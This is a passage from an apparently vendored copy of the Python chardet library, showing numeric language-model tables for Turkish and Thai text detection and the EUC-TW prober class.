0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,2,0,0,2,2,1,0,0,1,0,0,3,3,1,3,0,0,1,1,0,2,0,3,0,0,0,2,0,1,1,\n0,1,2,0,1,2,2,0,2,2,2,2,1,0,2,1,1,0,2,0,2,1,2,0,0,0,0,0,0,0,0,0,\n3,3,3,1,3,2,3,2,0,2,2,2,1,3,2,0,2,1,2,0,1,2,0,0,1,0,2,2,0,0,0,2,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,\n3,3,3,0,3,3,1,1,2,3,1,0,3,2,3,0,3,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,\n1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,3,3,0,3,3,2,3,3,2,2,0,0,0,0,1,2,0,1,3,0,0,0,3,1,1,0,3,0,2,\n2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,1,2,2,1,0,3,1,1,1,1,3,3,2,3,0,0,1,0,1,2,0,2,2,0,2,2,0,2,1,\n0,2,2,1,1,1,1,0,2,1,1,0,1,1,1,1,2,1,2,1,2,0,1,0,1,0,0,0,0,0,0,0,\n3,3,3,0,1,1,3,0,0,1,1,0,0,2,2,0,3,0,0,1,1,0,1,0,0,0,0,0,2,0,0,0,\n0,3,1,0,1,0,1,0,2,0,0,1,0,1,0,1,1,1,2,1,1,0,2,0,0,0,0,0,0,0,0,0,\n3,3,3,0,2,0,2,0,1,1,1,0,0,3,3,0,2,0,0,1,0,0,2,1,1,0,1,0,1,0,1,0,\n0,2,0,1,2,0,2,0,2,1,1,0,1,0,2,1,1,0,2,1,1,0,1,0,0,0,1,1,0,0,0,0,\n3,2,3,0,1,0,0,0,0,0,0,0,0,1,2,0,1,0,0,1,0,0,1,0,0,0,0,0,2,0,0,0,\n0,0,1,1,0,0,1,0,1,0,0,1,0,0,0,2,1,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,0,0,2,3,0,0,1,0,1,0,2,3,2,3,0,0,1,3,0,2,1,0,0,0,0,2,0,1,0,\n0,2,1,0,0,1,1,0,2,1,0,0,1,0,0,1,1,0,1,1,2,0,1,0,0,0,0,1,0,0,0,0,\n3,2,2,0,0,1,1,0,0,0,0,0,0,3,1,1,1,0,0,0,0,0,1,0,0,0,0,0,2,0,1,0,\n0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,3,3,0,2,3,2,2,1,2,2,1,1,2,0,1,3,2,2,2,0,0,2,2,0,0,0,1,2,1,\n3,0,2,1,1,0,1,1,1,0,1,2,2,2,1,1,2,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,\n0,1,1,2,3,0,3,3,3,2,2,2,2,1,0,1,0,1,0,1,2,2,0,0,2,2,1,3,1,1,2,1,\n0,0,1,1,2,0,1,1,0,0,1,2,0,2,1,1,2,0,0,1,0,0,0,1,0,1,0,1,0,0,0,0,\n3,3,2,0,0,3,1,0,0,0,0,0,0,3,2,1,2,0,0,1,0,0,2,0,0,0,0,0,2,0,1,0,\n0,2,1,1,0,0,1,0,1,2,0,0,1,1,0,0,2,1,1,1,1,0,2,0,0,0,0,0,0,0,0,0,\n3,3,2,0,0,1,0,0,0,0,1,0,0,3,3,2,2,0,0,1,0,0,2,0,1,0,0,0,2,0,1,0,\n0,0,1,1,0,0,2,0,2,1,0,0,1,1,2,1,2,0,2,1,2,1,1,1,0,0,1,1,0,0,0,0,\n3,3,2,0,0,2,2,0,0,0,1,1,0,2,2,1,3,1,0,1,0,1,2,0,0,0,0,0,1,0,1,0,\n0,1,1,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,2,0,0,0,1,0,0,1,0,0,2,3,1,2,0,0,1,0,0,2,0,0,0,1,0,2,0,2,0,\n0,1,1,2,2,1,2,0,2,1,1,0,0,1,1,0,1,1,1,1,2,1,1,0,0,0,0,0,0,0,0,0,\n3,3,3,0,2,1,2,1,0,0,1,1,0,3,3,1,2,0,0,1,0,0,2,0,2,0,1,1,2,0,0,0,\n0,0,1,1,1,1,2,0,1,1,0,1,1,1,1,0,0,0,1,1,1,0,1,0,0,0,1,0,0,0,0,0,\n3,3,3,0,2,2,3,2,0,0,1,0,0,2,3,1,0,0,0,0,0,0,2,0,2,0,0,0,2,0,0,0,\n0,1,1,0,0,0,1,0,0,1,0,1,1,0,1,0,1,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,0,0,0,0,0,0,0,1,0,0,2,2,2,2,0,0,1,0,0,2,0,0,0,0,0,2,0,1,0,\n0,0,2,1,1,0,1,0,2,1,1,0,0,1,1,2,1,0,2,0,2,0,1,0,0,0,2,0,0,0,0,0,\n0,0,0,2,2,0,2,1,1,1,1,2,2,0,0,1,0,1,0,0,1,3,0,0,0,0,1,0,0,2,1,0,\n0,0,1,0,1,0,0,0,0,0,2,1,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,\n2,0,0,2,3,0,2,3,1,2,2,0,2,0,0,2,0,2,1,1,1,2,1,0,0,1,2,1,1,2,1,0,\n1,0,2,0,1,0,1,1,0,0,2,2,1,2,1,1,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,0,2,1,2,0,0,0,1,0,0,3,2,0,1,0,0,1,0,0,2,0,0,0,1,2,1,0,1,0,\n0,0,0,0,1,0,1,0,0,1,0,0,0,0,1,0,1,0,1,1,1,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,2,2,0,2,2,1,1,0,1,1,1,1,1,0,0,1,2,1,1,1,0,1,0,0,0,1,1,1,1,\n0,0,2,1,0,1,1,1,0,1,1,2,1,2,1,1,2,0,1,1,2,1,0,2,0,0,0,0,0,0,0,0,\n3,2,2,0,0,2,0,0,0,0,0,0,0,2,2,0,2,0,0,1,0,0,2,0,0,0,0,0,2,0,0,0,\n0,2,1,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,3,2,0,2,2,0,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,0,0,0,0,\n2,0,1,0,1,0,1,1,0,0,1,2,0,1,0,1,1,0,0,1,0,1,0,2,0,0,0,0,0,0,0,0,\n2,2,2,0,1,1,0,0,0,1,0,0,0,1,2,0,1,0,0,1,0,0,1,0,0,0,0,1,2,0,1,0,\n0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,1,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,1,0,1,1,1,0,0,0,0,1,2,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,\n1,1,2,0,1,0,0,0,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,2,0,0,0,0,0,1,\n0,0,1,2,2,0,2,1,2,1,1,2,2,0,0,0,0,1,0,0,1,1,0,0,2,0,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,\n2,2,2,0,0,0,1,0,0,0,0,0,0,2,2,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,0,1,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,1,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n)\n\nLatin5TurkishModel = {\n  'char_to_order_map': Latin5_TurkishCharToOrderMap,\n  'precedence_matrix': TurkishLangModel,\n  'typical_positive_ratio': 0.970290,\n  'keep_english_letter': True,\n  'charset_name': \"ISO-8859-9\",\n  'language': 'Turkish',\n}\n", "thirdparty/chardet/euctwprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import EUCTWDistributionAnalysis\nfrom .mbcssm import EUCTW_SM_MODEL\n\nclass EUCTWProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCTWProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)\n        self.distribution_analyzer = EUCTWDistributionAnalysis()\n        self.reset()\n\n    @property\n    def charset_name(self):\n        return \"EUC-TW\"\n\n    @property\n    def language(self):\n        return \"Taiwan\"\n", "thirdparty/chardet/langthaimodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# The following result for thai was collected from a limited sample (1M).\n\n# Character Mapping Table:\nTIS620CharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,182,106,107,100,183,184,185,101, 94,186,187,108,109,110,111,  # 40\n188,189,190, 89, 95,112,113,191,192,193,194,253,253,253,253,253,  # 50\n253, 64, 72, 73,114, 74,115,116,102, 81,201,117, 90,103, 78, 82,  # 60\n 96,202, 91, 79, 84,104,105, 97, 98, 92,203,253,253,253,253,253,  # 70\n209,210,211,212,213, 88,214,215,216,217,218,219,220,118,221,222,\n223,224, 99, 85, 83,225,226,227,228,229,230,231,232,233,234,235,\n236,  5, 30,237, 24,238, 75,  8, 26, 52, 34, 51,119, 47, 58, 57,\n 49, 53, 55, 43, 20, 19, 44, 14, 48,  3, 17, 25, 39, 62, 31, 54,\n 45,  9, 16,  2, 61, 15,239, 12, 42, 46, 18, 21, 76,  4, 66, 63,\n 22, 10,  1, 36, 23, 13, 40, 27, 32, 35, 86,240,241,242,243,244,\n 11, 28, 41, 29, 33,245, 50, 37,  6,  7, 67, 77, 38, 93,246,247,\n 68, 56, 59, 65, 69, 60, 70, 80, 71, 87,248,249,250,251,252,253,\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 92.6386%\n# first 1024 sequences:7.3177%\n# rest  sequences:     1.0230%\n# negative sequences:  0.0436%\nThaiLangModel = (\n0,1,3,3,3,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,0,0,3,3,3,0,3,3,3,3,\n0,3,3,0,0,0,1,3,0,3,3,2,3,3,0,1,2,3,3,3,3,0,2,0,2,0,0,3,2,1,2,2,\n3,0,3,3,2,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,0,3,2,3,0,2,2,2,3,\n0,2,3,0,0,0,0,1,0,1,2,3,1,1,3,2,2,0,1,1,0,0,1,0,0,0,0,0,0,0,1,1,\n3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,3,3,2,3,2,3,3,2,2,2,\n3,1,2,3,0,3,3,2,2,1,2,3,3,1,2,0,1,3,0,1,0,0,1,0,0,0,0,0,0,0,1,1,\n3,3,2,2,3,3,3,3,1,2,3,3,3,3,3,2,2,2,2,3,3,2,2,3,3,2,2,3,2,3,2,2,\n3,3,1,2,3,1,2,2,3,3,1,0,2,1,0,0,3,1,2,1,0,0,1,0,0,0,0,0,0,1,0,1,\n3,3,3,3,3,3,2,2,3,3,3,3,2,3,2,2,3,3,2,2,3,2,2,2,2,1,1,3,1,2,1,1,\n3,2,1,0,2,1,0,1,0,1,1,0,1,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,\n3,3,3,2,3,2,3,3,2,2,3,2,3,3,2,3,1,1,2,3,2,2,2,3,2,2,2,2,2,1,2,1,\n2,2,1,1,3,3,2,1,0,1,2,2,0,1,3,0,0,0,1,1,0,0,0,0,0,2,3,0,0,2,1,1,\n3,3,2,3,3,2,0,0,3,3,0,3,3,0,2,2,3,1,2,2,1,1,1,0,2,2,2,0,2,2,1,1,\n0,2,1,0,2,0,0,2,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,2,3,3,2,0,0,3,3,0,2,3,0,2,1,2,2,2,2,1,2,0,0,2,2,2,0,2,2,1,1,\n0,2,1,0,2,0,0,2,0,1,1,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,\n3,3,2,3,2,3,2,0,2,2,1,3,2,1,3,2,1,2,3,2,2,3,0,2,3,2,2,1,2,2,2,2,\n1,2,2,0,0,0,0,2,0,1,2,0,1,1,1,0,1,0,3,1,1,0,0,0,0,0,0,0,0,0,1,0,\n3,3,2,3,3,2,3,2,2,2,3,2,2,3,2,2,1,2,3,2,2,3,1,3,2,2,2,3,2,2,2,3,\n3,2,1,3,0,1,1,1,0,2,1,1,1,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0,2,0,0,\n1,0,0,3,0,3,3,3,3,3,0,0,3,0,2,2,3,3,3,3,3,0,0,0,1,1,3,0,0,0,0,2,\n0,0,1,0,0,0,0,0,0,0,2,3,0,0,0,3,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,\n2,0,3,3,3,3,0,0,2,3,0,0,3,0,3,3,2,3,3,3,3,3,0,0,3,3,3,0,0,0,3,3,\n0,0,3,0,0,0,0,2,0,0,2,1,1,3,0,0,1,0,0,2,3,0,1,0,0,0,0,0,0,0,1,0,\n3,3,3,3,2,3,3,3,3,3,3,3,1,2,1,3,3,2,2,1,2,2,2,3,1,1,2,0,2,1,2,1,\n2,2,1,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,\n3,0,2,1,2,3,3,3,0,2,0,2,2,0,2,1,3,2,2,1,2,1,0,0,2,2,1,0,2,1,2,2,\n0,1,1,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,2,1,3,3,1,1,3,0,2,3,1,1,3,2,1,1,2,0,2,2,3,2,1,1,1,1,1,2,\n3,0,0,1,3,1,2,1,2,0,3,0,0,0,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,\n3,3,1,1,3,2,3,3,3,1,3,2,1,3,2,1,3,2,2,2,2,1,3,3,1,2,1,3,1,2,3,0,\n2,1,1,3,2,2,2,1,2,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,\n3,3,2,3,2,3,3,2,3,2,3,2,3,3,2,1,0,3,2,2,2,1,2,2,2,1,2,2,1,2,1,1,\n2,2,2,3,0,1,3,1,1,1,1,0,1,1,0,2,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,2,3,2,2,1,1,3,2,3,2,3,2,0,3,2,2,1,2,0,2,2,2,1,2,2,2,2,1,\n3,2,1,2,2,1,0,2,0,1,0,0,1,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,2,3,1,2,3,3,2,2,3,0,1,1,2,0,3,3,2,2,3,0,1,1,3,0,0,0,0,\n3,1,0,3,3,0,2,0,2,1,0,0,3,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,2,3,2,3,3,0,1,3,1,1,2,1,2,1,1,3,1,1,0,2,3,1,1,1,1,1,1,1,1,\n3,1,1,2,2,2,2,1,1,1,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,2,2,1,1,2,1,3,3,2,3,2,2,3,2,2,3,1,2,2,1,2,0,3,2,1,2,2,2,2,2,1,\n3,2,1,2,2,2,1,1,1,1,0,0,1,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,1,3,3,0,2,1,0,3,2,0,0,3,1,0,1,1,0,1,0,0,0,0,0,1,\n1,0,0,1,0,3,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,2,2,2,3,0,0,1,3,0,3,2,0,3,2,2,3,3,3,3,3,1,0,2,2,2,0,2,2,1,2,\n0,2,3,0,0,0,0,1,0,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,0,2,3,1,3,3,2,3,3,0,3,3,0,3,2,2,3,2,3,3,3,0,0,2,2,3,0,1,1,1,3,\n0,0,3,0,0,0,2,2,0,1,3,0,1,2,2,2,3,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,\n3,2,3,3,2,0,3,3,2,2,3,1,3,2,1,3,2,0,1,2,2,0,2,3,2,1,0,3,0,0,0,0,\n3,0,0,2,3,1,3,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,3,2,2,2,1,2,0,1,3,1,1,3,1,3,0,0,2,1,1,1,1,2,1,1,1,0,2,1,0,1,\n1,2,0,0,0,3,1,1,0,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,0,3,1,0,0,0,1,0,\n3,3,3,3,2,2,2,2,2,1,3,1,1,1,2,0,1,1,2,1,2,1,3,2,0,0,3,1,1,1,1,1,\n3,1,0,2,3,0,0,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,2,3,0,3,3,0,2,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,2,3,1,3,0,0,1,2,0,0,2,0,3,3,2,3,3,3,2,3,0,0,2,2,2,0,0,0,2,2,\n0,0,1,0,0,0,0,3,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n0,0,0,3,0,2,0,0,0,0,0,0,0,0,0,0,1,2,3,1,3,3,0,0,1,0,3,0,0,0,0,0,\n0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,1,2,3,1,2,3,1,0,3,0,2,2,1,0,2,1,1,2,0,1,0,0,1,1,1,1,0,1,0,0,\n1,0,0,0,0,1,1,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,2,1,0,1,1,1,3,1,2,2,2,2,2,2,1,1,1,1,0,3,1,0,1,3,1,1,1,1,\n1,1,0,2,0,1,3,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,\n3,0,2,2,1,3,3,2,3,3,0,1,1,0,2,2,1,2,1,3,3,1,0,0,3,2,0,0,0,0,2,1,\n0,1,0,0,0,0,1,2,0,1,1,3,1,1,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,0,3,0,0,1,0,0,0,3,0,0,3,0,3,1,0,1,1,1,3,2,0,0,0,3,0,0,0,0,2,0,\n0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,\n3,3,1,3,2,1,3,3,1,2,2,0,1,2,1,0,1,2,0,0,0,0,0,3,0,0,0,3,0,0,0,0,\n3,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,1,2,0,3,3,3,2,2,0,1,1,0,1,3,0,0,0,2,2,0,0,0,0,3,1,0,1,0,0,0,\n0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,2,3,1,2,0,0,2,1,0,3,1,0,1,2,0,1,1,1,1,3,0,0,3,1,1,0,2,2,1,1,\n0,2,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,3,1,2,0,0,2,2,0,1,2,0,1,0,1,3,1,2,1,0,0,0,2,0,3,0,0,0,1,0,\n0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,1,1,2,2,0,0,0,2,0,2,1,0,1,1,0,1,1,1,2,1,0,0,1,1,1,0,2,1,1,1,\n0,1,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,1,\n0,0,0,2,0,1,3,1,1,1,1,0,0,0,0,3,2,0,1,0,0,0,1,2,0,0,0,1,0,0,0,0,\n0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,2,3,2,2,0,0,0,1,0,0,0,0,2,3,2,1,2,2,3,0,0,0,2,3,1,0,0,0,1,1,\n0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,\n3,3,2,2,0,1,0,0,0,0,2,0,2,0,1,0,0,0,1,1,0,0,0,2,1,0,1,0,1,1,0,0,\n0,1,0,2,0,0,1,0,3,0,1,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,1,0,0,1,0,0,0,0,0,1,1,2,0,0,0,0,1,0,0,1,3,1,0,0,0,0,1,1,0,0,\n0,1,0,0,0,0,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,\n3,3,1,1,1,1,2,3,0,0,2,1,1,1,1,1,0,2,1,1,0,0,0,2,1,0,1,2,1,1,0,1,\n2,1,0,3,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,3,1,0,0,0,0,0,0,0,3,0,0,0,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,\n0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,2,0,0,0,0,0,0,1,2,1,0,1,1,0,2,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,2,0,0,0,1,3,0,1,0,0,0,2,0,0,0,0,0,0,0,1,2,0,0,0,0,0,\n3,3,0,0,1,1,2,0,0,1,2,1,0,1,1,1,0,1,1,0,0,2,1,1,0,1,0,0,1,1,1,0,\n0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,1,0,0,0,0,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,\n2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,0,0,1,1,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,1,0,1,2,0,1,2,0,0,1,1,0,2,0,1,0,0,1,0,0,0,0,1,0,0,0,2,0,0,0,0,\n1,0,0,1,0,1,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,1,0,0,0,0,0,0,0,1,1,0,1,1,0,2,1,3,0,0,0,0,1,1,0,0,0,0,0,0,0,3,\n1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,1,0,1,0,0,2,0,0,2,0,0,1,1,2,0,0,1,1,0,0,0,1,0,0,0,1,1,0,0,0,\n1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,3,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,\n1,0,0,0,0,0,0,0,0,1,0,0,0,0,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,1,1,0